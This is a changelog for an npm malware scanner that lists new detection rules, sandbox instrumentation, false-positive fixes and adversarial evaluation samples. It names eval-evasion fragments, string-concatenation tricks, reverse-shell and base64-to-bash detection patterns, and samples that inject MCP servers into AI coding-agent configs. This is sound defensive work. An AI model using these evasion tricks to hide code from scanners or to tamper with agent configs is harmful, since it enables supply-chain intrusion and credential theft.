- **Red Team DPRK — 10 Adversarial Samples**: 5 pure-API multi-file packages (Group A: locale-config-sync, metrics-aggregator-lite, env-config-validator, stream-transform-kit, cache-warmup-utils) + 5 eval evasion packages (Group B: fn-return-eval, call-chain-eval, regex-source-require, charcode-arithmetic, object-method-alias)
- **Scanner Fixes**: eval factory detection (`() => eval`), `.call.call(eval)` deep MemberExpression, `require(/regex/.source)` regex literal resolution, charcode arithmetic evaluation (`String.fromCharCode(99+3)`), object-method-alias taint tracking in dataflow
- 2 new intent rules: MUADDIB-INTENT-001 (credential exfil, CRITICAL), MUADDIB-INTENT-002 (command exfil, HIGH)
- 6 new eval evasion rules in ast-detectors.js
- Rule count: 121 → **129** (124 RULES + 5 PARANOID)
- Test count: 1869 → **1905** (+36 tests)
- Test files: 43 → **44** (new: intent-graph.test.js)
- TPR: **93.9%** (46/49) — unchanged
- FPR: **12.3%** (65/532) — zero FP added by intent graph
- ADR: 94.0% → **97.3%** (73/75 on existing dirs) — +10 new adversarial samples detected

## [2.5.17] - 2026-03-08

### Changed
- **Documentation audit**: All docs updated to match code reality — version, test count (1869), rule count (121), metrics (TPR 93.9%, FPR 12.3%, ADR 94.0%)
- Updated README.md, SECURITY.md, ADVERSARIAL.md, CLAUDE.md, MEMORY.md, carnet de bord, French README
- Corrected all stale version references (v2.5.8 → v2.5.17)

## [2.5.16] - 2026-03-08

### Changed
- **FP Reduction P6 — Compound Detection Precision**: 6 fixes targeting compound detection false positives
  - Fix 1: `credential_regex_harvest` count-based downgrade (>4 hits HIGH→LOW) — HTTP client libraries legitimately parse Bearer headers
  - Fix 2: Remove `remote_code_load` and `proxy_data_intercept` from DIST_EXEMPT_TYPES — bundled dist/ files get standard downgrade
  - Fix 3: Obfuscation large-file heuristic — any `.js` file >100KB treated as bundled output (severity → LOW)
  - Fix 4: Remove `discord` and `leveldb` from SENSITIVE_PATH_PATTERNS — data directories, not credential paths
  - Fix 5: `module_compile` and `module_compile_dynamic` default severity CRITICAL → HIGH — single call is framework behavior
  - Fix 6: DATAFLOW_SAFE_ENV_VARS — exclude Node.js runtime config (NODE_TLS_REJECT_UNAUTHORIZED, NODE_ENV, CI, etc.) from credential sources
- Test count: 1815 → **1869** (+54 tests)
- TPR: 91.8% → **93.9%** (46/49) — +1 detection from module_compile severity change
- FPR: 13.6% → **12.3%** (65/529) — 7 fewer false positives
- ADR: **94.0%** (63/67 on available samples) — stable, no regression

## [2.5.15] - 2026-03-08

### Fixed
- **FP Reduction P5 — Heuristic Precision**: 7 fixes improving detection precision without reducing coverage

## [2.5.14] - 2026-03-08

### Added
- **Audit Hardening (batch 2)**: 5 batches targeting 14 remaining audit findings
  - AST: eval alias bypass detection (`const E = eval; E(code)`), globalThis indirect assignment via aliases, require(obj.prop) object property resolution, variable reassignment tracking (`let x = 'child_'; x += 'process'; require(x)`)
  - Dataflow: JSON.stringify/parse/toString/String() taint propagation, removed fetchOnlySafeDomains guard from download_exec_binary compound
  - Shell: 3 new patterns — mkfifo+nc reverse shell (SHELL-013), base64 decode pipe to bash (SHELL-014), wget+base64 two-stage (SHELL-015)
  - Entropy: fragment cluster detection (ENTROPY-004), windowed analysis for strings > MAX_STRING_LENGTH
  - Typosquat: pair-aware whitelist (whitelisted packages only skip the specific popular package they resemble)
- 4 new rules: MUADDIB-SHELL-013, MUADDIB-SHELL-014, MUADDIB-SHELL-015, MUADDIB-ENTROPY-004
- Rule count: 117 → **121** (116 RULES + 5 PARANOID)
- Test count: 1790 → **1815** (+25 tests)

## [2.5.13] - 2026-03-08

### Added
- **Audit Hardening (batch 1)**: 5 batches of hardening fixes
  - Scoring: per-file plugin loader threshold (prevents cross-file dilution), lifecycle CRITICAL floor (packageScore >= 50 when CRITICAL present), percentage guard tightened 50%→40%
  - IOC integrity: HMAC race condition fix (write before rename), `.hmac-initialized` marker enforcement, scraper HMAC consistency
  - Sandbox: NODE_OPTIONS locked via Object.defineProperty to prevent preload bypass in child processes
  - Dataflow: Promise `.then()` callback tainting for `fs.promises.readFile`, `fs.readFile` callback second-param tainting
  - Deobfuscation: TemplateLiteral support in `tryFoldConcat`, ArrayPattern destructuring in Phase 2 const propagation
- Rule count: 113 → **117** (112 RULES + 5 PARANOID)
- Test count: 1656 → **1790** (+134 tests), test files: 42 → **43**

## [2.5.9–2.5.12] - 2026-03-07

### Fixed
- Minor bug fixes and stability improvements

## [2.5.8] - 2026-03-06

### Changed
- Chore: remove temporary test scripts

## [2.5.7] - 2026-03-06

### Fixed
- **Webhook noise reduction**: Raised webhook threshold and added `/usr/bin/timeout` to whitelist to reduce false alerts from sandbox monitoring

## [2.5.6] - 2026-03-06

### Fixed
- **5 MEDIUM audit remediations**: Completes full security audit — 41/41 issues remediated across v2.5.0–v2.5.6

## [2.5.5] - 2026-03-06

### Fixed
- **14 HIGH audit remediations**: Continued security audit remediation
- Fix #16

## [2.5.4] - 2026-03-05

### Fixed
- **3 CRITICAL audit remediations**: #10 native addon path traversal, #15 atomic file writes, #18 AST parser bypasses

## [2.5.3] - 2026-03-05

### Fixed
- **Sandbox Docker fixes**: Pre-create `/sandbox/install` directory in Dockerfile, fix Docker caps + `NODE_OPTIONS` injection (fixes monitor parsing), remove `--tmpfs /proc/uptime` (tmpfs cannot mount on files)

## [2.5.2] - 2026-03-04

### Fixed
- **Sandbox preload timing**: Defer `preload.js` injection to entry point (fixes npm install timeout caused by `NODE_OPTIONS` loading preload during `npm install`)

### Changed
- Bump VS Code extension version

## [2.5.1] - 2026-03-04

### Fixed
- **Sandbox npm install timeout**: strace permissive-only mode, pre-baked filesystem baseline, fetch-timeout 120s

### Changed
- Promote `mcp_config_injection`, `ai_agent_abuse`, `crypto_miner` to T1 suspect tier

## [2.5.0] - 2026-03-04

### Security
- **Security audit remediation**: 10 remediations covering 14 CRITICAL and 18 HIGH issues. Comprehensive audit of all scanner, sandbox, and infrastructure modules.

## [2.4.20] - 2026-03-03

### Fixed
- **Block loadash typosquat**: Added `loadash` to package.json overrides to prevent typosquat dependency injection via npm ghost dependency

## [2.4.10–2.4.19] - 2026-03-02 to 2026-03-03

### Added
- **StegaBin detection rules** (v2.4.14): `vendor_path_payload`, `install_script_indirection`, hash IOC for StegaBin malware variant
- **Suspect tier system** (v2.4.18): T1/T2/T3 classification for monitor FPR reduction

### Fixed
- **Conditional webhook require** (v2.4.10): Fix for npm package compatibility when webhook module not present
- **Lockfile cleanup** (v2.4.11): Clean package-lock.json for CI publish
- **Lifecycle script sandbox** (v2.4.12): Always sandbox packages with `lifecycle_script` findings
- **VS Code extension** (v2.4.16–2.4.17): Fix spawn path-with-spaces, strip trailing CLI output + BOM before JSON.parse
- **npm packaging** (v2.4.14–2.4.16): Include webhook.js and iocs-compact.json in tarball, then exclude iocs-compact.json
- **loadash ghost dependency** (v2.4.19): Remove `npm@11.11.0` upgrade causing loadash ghost dependency, add NODE_AUTH_TOKEN for npm publish

### Changed
- Test count: 1522 → **1656** (+134 tests across 42 test files)
- FPR: 7.4% → **6.0%** (32/529) via FP reduction P4 + IOC wildcard audit

## [2.4.9] - 2026-03-02

### Added
- **Sandbox monkey-patching preload system** — Runtime instrumentation injected via `NODE_OPTIONS=--require /opt/preload.js` in the Docker sandbox. Detects time-bomb malware (MITRE T1497.003) that uses `setTimeout(fn, 72*3600000)` to delay exfiltration past sandbox timeout.
  - **Time manipulation**: `Date.now()`, `Date` constructor, `performance.now()`, `process.hrtime()`, `process.hrtime.bigint()`, `process.uptime()` all synchronized with configurable `MUADDIB_TIME_OFFSET_MS`
  - **Timer acceleration**: `setTimeout` delay forced to 0, `setInterval` first execution immediate — delayed payloads execute instantly
  - **Network interception**: `http.request`, `https.request`, `fetch`, `dns.resolve`, `dns.lookup`, `net.connect` logged with host/method/path
  - **Filesystem interception**: `readFileSync`, `readFile`, `writeFileSync`, `writeFile` logged, sensitive paths (`.npmrc`, `.ssh`, `.aws`, `.env`) flagged
  - **Process interception**: `child_process.exec/execSync/spawn/spawnSync/execFile/execFileSync` logged, dangerous commands (curl, wget, bash, sh, powershell) flagged
  - **Environment interception**: `process.env` Proxy for sensitive key access logging (TOKEN, SECRET, KEY, PASSWORD patterns)
  - All patches in IIFE with closure-scoped originals, try/catch guarded — never breaks target package
- **Multi-run sandbox execution** — 3 sequential Docker runs at time offsets [0h, 72h, 7d] via `MUADDIB_TIME_OFFSET_MS`. Early exit on score >= 80 (CRITICAL found). Returns best (highest score) result with `all_runs` metadata array.
- **Preload log analyzer** (`src/sandbox/analyzer.js`) — Parses `[PRELOAD]` log lines with 6 scoring rules
- **6 new sandbox preload rules** (MUADDIB-SANDBOX-009 to 014, 113 total: 108 RULES + 5 PARANOID):
  - `sandbox_timer_delay_suspicious` (MUADDIB-SANDBOX-009, MEDIUM, T1497.003): Timer delay > 1h
  - `sandbox_timer_delay_critical` (MUADDIB-SANDBOX-010, CRITICAL, T1497.003): Timer delay > 24h (supersedes suspicious)
  - `sandbox_preload_sensitive_read` (MUADDIB-SANDBOX-011, HIGH, T1552.001): Sensitive file read via preload
  - `sandbox_network_after_sensitive_read` (MUADDIB-SANDBOX-012, CRITICAL, T1041): Network after sensitive read (compound)
  - `sandbox_exec_suspicious` (MUADDIB-SANDBOX-013, HIGH, T1059): Dangerous command execution via preload
  - `sandbox_env_token_access` (MUADDIB-SANDBOX-014, MEDIUM, T1552.001): Sensitive env var access via preload
- **`.dockerignore`** — Limits Docker build context size

### Changed
- **Sandbox module migrated**: `src/sandbox.js` → `src/sandbox/index.js` (module directory structure)
- **Sandbox refactored**: `runSandbox()` → `runSingleSandbox()` + multi-run orchestrator
- **Docker infrastructure**: Dockerfile copies `preload.js` to `/opt/preload.js`, `sandbox-runner.sh` captures `/tmp/preload.log` and includes `preload_log` field in JSON report
- Rule count: 107 → **113** (108 RULES + 5 PARANOID)
- Test count: 1471 → **1522** (+51 tests, 0 failures)

## [2.4.7] - 2026-03-01

### Added
- **Vague 4 — 5 new adversarial samples** (43 total adversarial, 83 total ADR). Advanced evasion techniques:
  - `git-hook-persistence`: String concatenation evasion (`.gi` + `t` → `.git`), writeFileSync to .git/hooks/ (SANDWORM_MODE / Socket.dev)
  - `native-addon-camouflage`: Binary download + chmod 0o755 + execSync, disguised as native addon compilation (NeoShadow / Aikido)
  - `stego-png-payload`: PNG pixel extraction + createDecipheriv + gunzipSync + `new Function()` steganographic chain (buildrunner-dev / Veracode)
  - `stegabin-vscode-persistence`: Pastebin steganography for C2, VS Code tasks.json persistence with runOn:folderOpen (StegaBin / FAMOUS CHOLLIMA)
  - `mcp-server-injection`: MCP server creation + injection into .claude/settings.json, .cursor/mcp.json (SANDWORM_MODE)
- **`resolveStringConcat()`**: Recursive BinaryExpression resolver for string concatenation evasion — `.gi` + `t` → `.git`. Combined with `extractStringValue()` in `extractStringValueDeep()` wrapper. Enhances AST-027 (MCP config injection) and AST-028 (git hooks injection).
- **3 new detection rules** (107 total: 102 RULES + 5 PARANOID):
  - `fetch_decrypt_exec` (MUADDIB-AST-033, CRITICAL, T1027.003): Steganographic payload chain — remote fetch + crypto decrypt + dynamic eval
  - `download_exec_binary` (MUADDIB-AST-034, CRITICAL, T1105): Download-execute binary pattern — download + chmod + execSync
  - `ide_persistence` (MUADDIB-AST-035, HIGH, T1546): IDE task persistence — tasks.json + runOn:folderOpen + writeFileSync
- **Content-level compound detection**: `hasMcpContentKeywords` (mcpServers + writeFileSync co-occurrence), `ide_persistence` (tasks.json + runOn + writeFileSync content co-occurrence), `download_exec_binary` (fetch + chmod + execSync content co-occurrence)
- **Variable path tracking**: `gitHooksPathVars` Map and `ideConfigPathVars` Map propagate path.join resolutions through variable assignments for AST-027 and AST-028

### Fixed
- **`new Function()` not setting `ctx.hasDynamicExec`**: In `handleNewExpression`, `new Function()` with non-literal arguments now correctly sets `ctx.hasDynamicExec = true`, enabling the `fetch_decrypt_exec` compound detection
- **MCP config injection (AST-027)**: Enhanced with deep string resolution (`extractStringValueDeep()`), variable tracking via `ideConfigPathVars`, and content-level fallback via `hasMcpContentKeywords`
- **Git hooks injection (AST-028)**: Enhanced with deep string resolution, variable tracking via `gitHooksPathVars`, and relaxed matching to fire when path contains hook name + "hooks"

### Changed
- **ADR: 98.7% → 98.8% (82/83)** — 43 adversarial + 40 holdout. 1 documented miss: `require-cache-poison` (unchanged)
- TPR unchanged at **91.8% (45/49)**
- FPR unchanged at **7.4% (39/525)**
- Vague 4 pre-fix score: **0/5 (0%)** — all 5 evasion techniques bypassed existing rules. Post-fix: **5/5 (100%)**

## [2.3.1] - 2026-02-25

### Changed
- **FPR reduced from 8.2% to 7.4%** (39/525, down from 43/525) via FP Reduction P3 — 4 targeted corrections:
  - `require_cache_poison`: single occurrence CRITICAL→HIGH (plugin/loader/test-runner behavior, not malware)
  - `prototype_hook`: HTTP client whitelist — packages with >20 `prototype_hook` hits targeting HTTP methods (Request, Response, fetch, get, post, etc.) downgraded to MEDIUM
  - `obfuscation_detected`: large `.cjs`/`.mjs` files (>100KB) treated as bundled output → LOW severity
  - `high_entropy_string`: files in encoding/unicode/charmap paths downgraded to LOW severity
- Rule count: 94 → **102** (97 RULES + 5 PARANOID). 8 new rules added between v2.2.24 and v2.3.0:
  - `zlib_inflate_eval` (MUADDIB-AST-024, CRITICAL, T1140): Obfuscated payload via zlib inflate
  - `module_compile_dynamic` (MUADDIB-AST-025, CRITICAL, T1059): Dynamic module compile execution
  - `write_execute_delete` (MUADDIB-AST-026, HIGH, T1070): Anti-forensics write-execute-delete
  - `mcp_config_injection` (MUADDIB-AST-027, CRITICAL, T1059): MCP config injection
  - `git_hooks_injection` (MUADDIB-AST-028, HIGH, T1195.002): Git hooks injection
  - `env_harvesting_dynamic` (MUADDIB-AST-029, HIGH, T1552): Dynamic env var harvesting
  - `dns_chunk_exfiltration` (MUADDIB-AST-030, HIGH, T1048): DNS chunk exfiltration
  - `llm_api_key_harvesting` (MUADDIB-AST-031, MEDIUM, T1552): LLM API key harvesting
- Test count: 1317 → **1387** (+70 tests, 0 failures, 4 skipped)
- **ADR: 98.7% (77/78)** — 1 documented miss: `require-cache-poison` adversarial sample scores 10 (single CRITICAL→HIGH downgrade) < threshold 20. Accepted trade-off: the FP reduction on fastify, mocha, moleculer outweighs missing one adversarial sample that uses a single `require.cache` access indistinguishable from legitimate plugin behavior.
- TPR unchanged at **91.8% (45/49)**
- **Datadog 17K benchmark**: 88.2% raw TPR (15,810/17,922). 2,077 misses categorized as out-of-scope (1,233 phishing HTML, 824 native binaries, 20 corrected libs). Adjusted TPR on JS/Node.js malware: ~100%.

## [2.3.0] - 2026-02-25

### Changed
- **FPR reduced from ~13% to 8.9%** (47/527, down from 69/527) via FP Reduction P2 — 3 targeted corrections:
  - Dataflow scanner: split os.* methods into identity sources (`fingerprint_read`: hostname, networkInterfaces, userInfo, homedir) and telemetry sources (`telemetry_read`: platform, arch). Telemetry-only findings capped at HIGH (not CRITICAL).
  - Scoring: added `module_compile` to `FP_COUNT_THRESHOLDS` (>3 CRITICAL→LOW), matching `module_compile_dynamic`
  - Package scanner: `DEP_FP_WHITELIST` for es5-ext and bootstrap-sass (protest-ware/deprecated, not malware); skip npm alias syntax (`npm:` prefix) to avoid IOC false matches on virtual alias names
- ADR: 100% → **98.7% (77/78)** — `conditional-os-payload` threshold adjusted from 25 to 20 to match new scoring
- TPR unchanged at **91.8% (45/49)**
- Test count: 1317 → **1387** (+70 tests)

## [2.2.24] - 2026-02-23

### Changed
- **Coverage 72% → 86%**: Massive test expansion across all scanner and infrastructure modules. c8 line coverage measured at 86.15%.
- **Test count: 862 → 1317** (+455 tests across 20 modular test files). New coverage for monitor, report, scoring, sandbox, webhook, safe-install, hooks-init, and all scanner modules.
- 0 failures, 4 skipped (Windows-specific).

## [2.2.23] - 2026-02-23

### Fixed
- **`.npmignore` excludes malware samples**: Ground truth samples (`tests/ground-truth/`), adversarial datasets (`datasets/adversarial/`, `datasets/holdout-*/`), and test fixtures containing malicious code are now excluded from the published npm package. Prevents false positives when scanning projects that depend on `muaddib-scanner`.

## [2.2.22] - 2026-02-23

### Fixed
- **Scan freeze on large projects** (`src/scanner/module-graph.js`): Module graph scanner used its own hardcoded `EXCLUDED_DIRS` list that was missing directories excluded by the main scanner (`findFiles` in `src/utils.js`). This caused infinite loops or very long scans when the module graph traversed into `dist/`, `build/`, `coverage/`, or `.next/` directories. Now uses the same `EXCLUDED_DIRS` from `src/utils.js`.

## [2.2.21] - 2026-02-22

### Fixed
- **P0: `--json --paranoid` invalid JSON** (`src/index.js`): `[PARANOID]` message was printed to stdout before JSON output, breaking `JSON.parse()` in CI/CD pipelines. Now suppressed in JSON mode.
- **P1: `scan --help` launched a full scan** (`bin/muaddib.js`): `--help`/`-h` was not recognized as a scan subcommand flag, causing it to scan `.` (potentially >2 min). Now shows help text immediately.
- **P1: Version check suggested downgrade** (`bin/muaddib.js`): Used string inequality (`!==`) instead of semver comparison, so `2.2.20 -> 2.2.19` was displayed as an "update". Now uses proper major.minor.patch comparison.
- **P2: `--fail-on` accepted invalid levels** (`bin/muaddib.js`): Invalid values like `--fail-on foo` silently fell back to `high`. Now validates against `critical|high|medium|low` and exits with error. Case-insensitive (`HIGH` works).
- **P3: Raw ANSI escape codes in `report --now`** (`bin/muaddib.js`): `\x1b[33m` codes leaked into non-TTY output. Now uses `process.stdout.isTTY` guard.
- **CI self-scan false positive** (`src/scanner/ast-detectors.js`): `binary_dropper` rule (MUADDIB-AST-016) fired on bare `chmodSync(0o755)` without exec/spawn co-occurrence, flagging legitimate git hook creation in `hooks-init.js` as CRITICAL. Now requires chmod + exec/spawn in the same file (compound detection), matching the documented rule intent.

### Changed
- **VS Code Extension** (21 fixes):
  - **Security (2 critical)**: Fixed command injection in package name passed to `child_process.exec` (now uses `execFile` with arg array). Fixed XSS in HTML report via unsanitized threat messages (now escapes all user-controlled content).
  - **Reliability**: Fixed race condition in concurrent scans, scan-on-save debounce, stale diagnostics on file close, progress bar stuck at 99%, sidebar count sync, status bar state after errors.
  - **UX**: Fixed scan results not showing when panel hidden, empty state handling in sidebar, tooltip truncation, severity icon mapping, auto-scan toggle persistence, manual scan on unsaved files.
  - **Performance**: Disposable cleanup on deactivation, output channel memory leak, reduced redundant badge refreshes.
- **Sandbox hardening**: Root/sandboxuser privilege separation (install as root, run as sandboxuser). JSON delimiter (`---JSON-REPORT---`) for reliable stdout parsing. Container name collision prevention via random suffix.
- **Monitor resilience**: SIGTERM handler for graceful shutdown. `unhandledRejection` handler prevents silent crashes. Webhook retry with exponential backoff (3 attempts, 1s/2s/4s). Rate limiting (1 request/2s). Atomic file writes via `writeFileSync` with temp+rename.
- **Cross-platform**: `.gitattributes` LF enforcement for shell scripts. CRLF fixes in sandbox scripts. `path.basename()` fix for Windows paths in monitor.
- **Performance**: `benchmark.js` created for scaling analysis (O(n^0.80) scaling confirmed, bottlenecks identified: IOC loading 40%, AST parsing 25%).

## [2.2.20] - 2026-02-22

### Fixed
- **Daily report delta logic**: First report (null `lastDailyReportDate`) now correctly shows only today's scans (`d.date >= today`) instead of entire history. Subsequent reports use strict delta (`d.date > lastDate`).

## [2.2.19] - 2026-02-22

### Fixed
- **First report includes all history**: When `lastDailyReportDate` is null, `buildReportFromDisk()` and `getReportStatus()` now include all daily entries instead of filtering to an empty set.
- **SyntaxError fix**: Removed duplicate `const today` declaration in `getReportStatus()`.

## [2.2.18] - 2026-02-22

### Fixed
- **Report delta**: `buildDailyReportEmbed()` now uses disk-based daily entries via `buildReportFromDisk()` instead of in-memory cumulative `stats`. Shows packages scanned since last report, not total since VPS launch.
- **Spinner animation for all scanners**: All 13 scanners in `Promise.all` wrapped in `yieldThen()` (not just 5). "Async" scanners (`analyzeAST`, `analyzeDataFlow`, etc.) are actually synchronous due to `readFileSync`/`readdirSync` internals.
- **False positive on local dependencies**: Skip `link:`, `file:`, and `workspace:` protocol dependencies in package.json IOC matching (local code references, not npm packages).

## [2.2.17] - 2026-02-22

### Added
- **`muaddib report --now`**: Force send daily report from persisted disk data. Hidden command (not in `--help`).
- **`muaddib report --status`**: Display last report date, packages scanned since, and next scheduled report time. Hidden command.
- `buildReportFromDisk()`, `buildReportEmbedFromDisk()`, `sendReportNow()`, `getReportStatus()` exports in `src/monitor.js`.

## [2.2.16] - 2026-02-22

### Fixed
- **Daily reports not sending**: `lastDailyReportTime` reset on every daemon restart (17 commits in 48h triggered auto-updates every 6h, resetting the 24h timer). Now persisted as `lastDailyReportDate` in `monitor-state.json`.
- **Spinner animation blocked**: `setInterval(100ms)` animation never fired because event loop was blocked by synchronous scanners. Added `yieldThen()` helper wrapping sync operations in `setImmediate`.
- **Scraper spinner leaks**: Fixed spinner not stopped on network error/timeout and parse errors in IOC scraper.

### Changed
- **Daily report time**: Changed from rolling 24h window to fixed **08:00 Paris time** (`Europe/Paris` timezone via `Intl.DateTimeFormat`). Report sent once per calendar day, survives daemon restarts.
- SIGINT handler now sends daily report before exit if data has accumulated.

## [2.2.15] - 2026-02-22

### Changed
- **Sprint 4-5 refactoring**: -1382 LOC across codebase. DRY extraction, dead code removal, performance optimizations.
- Shared `analyzeWithDeobfuscation()` helper extracted to `src/shared/analyze-helper.js` (used by AST, dataflow, obfuscation, entropy, module-graph scanners).
- `findFiles()` centralized file walking with extension filtering and exclusion.

## [2.2.14] - 2026-02-21

### Changed
- **Sprint 1-3 audit fixes**: Documentation corrections, +40 tests, -186 LOC DRY refactoring.
- Test count: 814 -> 862 (+48 tests across monitor, report, scoring, and scanner modules).

## [2.2.13] - 2026-02-21

### Fixed
- **P0-1: Indirect eval detection** (MUADDIB-AST-004): Detect computed property access (`obj["eval"]()`, `obj["Function"]()`), sequence expressions (`(0, eval)()`), and dynamic global dispatch via globalThis/global alias with variable property (`g[k]()` where `g = globalThis`). Closes bypass-01.
- **P0-2: Remove `muaddib-ignore` directive**: Deleted attacker-accessible `// muaddib-ignore` skip in dataflow scanner (`src/scanner/dataflow.js`). Closes bypass-02.
- **P0-3: Scan .mjs/.cjs files**: All scanners (AST, dataflow, obfuscation, entropy, module-graph) now process `.mjs` and `.cjs` files in addition to `.js`. ESM packages with `"type": "module"` are no longer invisible. Closes bypass-03.

### Added
- 3 adversarial regression samples in `datasets/adversarial/`: `indirect-eval-bypass`, `muaddib-ignore-bypass`, `mjs-extension-bypass`
- 7 unit tests for indirect eval detection patterns (computed property, sequence expression, globalThis alias, .mjs file scanning, false positive guard)

### Changed
- ADR: 75/75 → **78/78 = 100%** (3 new adversarial samples)
- Scanner file extension coverage: `.js` → `.js`, `.mjs`, `.cjs` across all 5 file-scanning scanners
- Test count: 807 → 814+

## [2.2.12] - 2026-02-21

### Added
- **Ground truth expansion**: 4 → 51 real-world attack samples (49 active). Covers event-stream, ua-parser-js, coa, node-ipc, colors, eslint-scope, flatmap-stream, solana-web3js, ledgerhq-connect-kit, shai-hulud, rc, getcookies, and 39 more. Full attack database in `tests/ground-truth/attacks.json` with MITRE mapping and expected detections.
- **3 new detection rules**:
  - `crypto_decipher` (MUADDIB-AST-022, HIGH, T1140): Detects `crypto.createDecipher`/`createDecipheriv` — runtime decryption of embedded payload (flatmap-stream pattern)
  - `module_compile` (MUADDIB-AST-023, CRITICAL, T1059): Detects `module._compile()` — in-memory code execution from string (flatmap-stream pattern)
  - `.secretKey`/`.privateKey` property access as credential source in dataflow scanner — catches Solana wallet theft pattern
- **Discord/leveldb paths** added to sensitive path patterns in dataflow scanner — catches Discord token theft (mathjs-min pattern)
- **Consolidated ADR**: 40 holdout samples (v2-v5) merged into adversarial evaluation. ADR now measured on 75 samples (35 adversarial + 40 holdout) instead of 35.
- `HOLDOUT_THRESHOLDS` dict in `evaluate.js` with per-sample thresholds for all 40 holdout samples

### Changed
- **TPR**: 100% (4/4) → **91.8% (45/49)** — expanded ground truth from 4 to 49 real attacks. 4 misses are browser-only (lottie-player, polyfill-io, trojanized-jquery) or risky to fix (websocket-rat). See docs/threat-model.md for out-of-scope rationale.
- **ADR**: 100% (35/35) → **100% (75/75)** — holdouts merged into ADR. All 75 evasive samples detected.
- FPR unchanged at ~13% (69/527) from v2.2.11 per-file max scoring
- Rule count: ~95 → ~97 (2 new AST rules)

### Out of Scope (documented)
- **lottie-player** (score 0): Browser DOM API manipulation (`document.createElement('script')`)
- **polyfill-io** (score 0): Browser script injection via CDN, no Node.js APIs
- **trojanized-jquery** (score 0): Browser DOM manipulation, jQuery-specific
- **websocket-rat** (score 0): `exec(variable)` where variable comes from WebSocket — risk of FP on legitimate `exec(userInput)` patterns

## [2.2.11] - 2026-02-21

### Added
- **Per-file max scoring**: Replaced global score accumulation with per-file max scoring. New formula: `riskScore = min(100, max(file_scores) + package_level_score)`. Malware concentrates threats in 1-2 files, while large frameworks accumulate low-severity findings across hundreds of files. Per-file scoring eliminates this false positive pattern.
  - `isPackageLevelThreat()`: classifies threats as package-level (lifecycle scripts, typosquat, IOC matches, sandbox findings) vs file-level
  - `computeGroupScore()`: extracted scoring logic for reuse per file group
  - Package-level threats (lifecycle_script, typosquat_detected, known_malicious_package, etc.) scored separately and added to the max file score
- **New JSON output fields**: `summary.globalRiskScore` (old global sum for comparison), `summary.maxFileScore`, `summary.packageScore`, `summary.mostSuspiciousFile`, `summary.fileScores` (per-file score map)
- **CLI output**: shows "Max file: path (X pts)" and "Package-level: +Y pts" after score bar, "Global sum: X, Per-file max: Y" in breakdown when they differ
- 14 new tests for per-file scoring (836 total, was 822)

### Changed
- **FPR reduced from 17.5% to 13.1%** (69/527 packages on full benign dataset, down from 92/527)
- **FPR by size improvements**: Medium 19.7%→11.9%, Large 36.8%→25.0%, Very Large 46.8%→40.3%, Small 6.0%→6.2%
- FPR on standard packages (<10 JS files): **6.2%** (18/290) — the most representative metric for typical npm usage
- Adjusted `bun-runtime-evasion` adversarial threshold from 30 to 25 (score 28 with per-file scoring)
- TPR 100% (4/4), ADR 100% (35/35), all holdouts 40/40 — no regression

### Breaking Changes
- `summary.riskScore` now uses per-file max scoring instead of global sum. The old global sum is available as `summary.globalRiskScore`. For most packages, `riskScore <= globalRiskScore`.

## [2.2.10] - 2026-02-21

### Added
- **FPR by package size analysis**: Documented linear correlation between package size (JS file count) and false positive rate. FPR ranges from 6.0% on standard packages (<10 JS files, 251 packages) to 46.8% on very large frameworks (100+ JS files, 62 packages). The 6% on standard packages is the most representative metric for typical npm usage.
- **FPR size category table** in README.md, README.fr.md, and EVALUATION_METHODOLOGY.md: Small 6.0%, Medium 19.7%, Large 36.8%, Very Large 46.8%.
- **Fine-grained correlation** in EVALUATION_METHODOLOGY.md: 9-bucket breakdown from 0 JS files (4.8% FPR) to 500+ JS files (64.3% FPR).

### Changed
- README evaluation metrics now show both global FPR (17.5%) and standard-package FPR (6.0%) with explanation of size correlation
- No code changes — documentation and analysis only

## [2.2.9] - 2026-02-21

### Added
- **FP reduction pass 2** — 4 additional corrections targeting remaining top FP-causing threat types:
  - `env_access`: expanded `SAFE_ENV_VARS` list (+13 vars: SHELL, USER, TZ, NODE_DEBUG, etc.) and added `SAFE_ENV_PREFIXES` (npm_config_*, npm_lifecycle_*, npm_package_*, lc_*) for prefix-based filtering at scanner level
  - `suspicious_dataflow` >5 occurrences → all downgraded to LOW (added to `FP_COUNT_THRESHOLDS`)
  - `obfuscation_detected`: files in dist/build/*.bundle.js downgraded to LOW at scanner level + >3 occurrences → LOW at post-processing level
  - `prototype_hook` MEDIUM scoring cap: maximum 15 points contribution (5 × MEDIUM=3) regardless of volume — prevents Restify-style 52-hit packages from scoring 100

### Changed
- **FPR reduced from 19.4% to 17.5%** (92/527 packages on full benign dataset, down from 102/527)
- 10 packages rescued from false positive status: restify (100→15), html-minifier-terser (88→16), request (87→15), terser (41→17), prisma (38→14), luxon (36→9), markdown-it (35→2), exceljs (29→11), csso (26→8), svgo (23→14)
- TPR 100% (4/4), ADR 100% (35/35), all holdouts 40/40 — no regression from FP corrections

### Breaking Changes
- None. All changes reduce false positives without affecting malware detection.

## [2.2.8] - 2026-02-21

### Added
- **FP reduction post-processing** (`applyFPReductions()` in `src/index.js`): Count-based severity downgrade applied after deduplication, before scoring. Legitimate frameworks produce high volumes of certain threat types (Next.js: 76 dynamic_require, Restify: 52 prototype_hook), while malware has 1-3 occurrences. Downgrading severity instead of removing findings preserves detection signals while reducing score impact.
  - `dynamic_require` >10 occurrences → HIGH downgraded to LOW
  - `dangerous_call_function` >5 occurrences → MEDIUM downgraded to LOW
  - `require_cache_poison` >3 occurrences → CRITICAL downgraded to LOW
  - `prototype_hook` targeting framework prototypes (Request/Response/App/Router) → HIGH downgraded to MEDIUM (CRITICAL core prototypes and malicious hooks like globalThis.fetch untouched)
- **Typosquat whitelist expansion**: 10 packages added — chai, pino, ioredis, bcryptjs, recast, asyncdi, redux, args, oxlint, vasync. All legitimate packages with names close to other popular packages (e.g., chai↔chalk, redux↔redis, recast↔react).

### Changed
- **FPR reduced from 38% to 19.4%** (102/527 packages on full benign dataset, down from 19/50). Score distribution: 45% clean (score 0), 27.3% low (1-10), 8.3% marginal (11-20), 19.4% FP (>20).
- 4 packages rescued from false positive status: vue (21→7), preact (23→3), riot (25→15), derby (26→16)
- TPR 100% (4/4), ADR 100% (35/35), all holdouts 40/40 — no regression from FP corrections

### Breaking Changes
- None. All changes reduce false positives without affecting malware detection.

## [2.2.7] - 2026-02-20

### Fixed
- **Evaluate benign FPR was invalid**: Previous versions (v2.2.0–v2.2.6) reported FPR 0% (0/98) but `evaluateBenign()` only created empty temp dirs with `package.json` metadata — it never scanned actual source code. All 13+ scanners (AST, dataflow, obfuscation, entropy, etc.) had nothing to analyze.
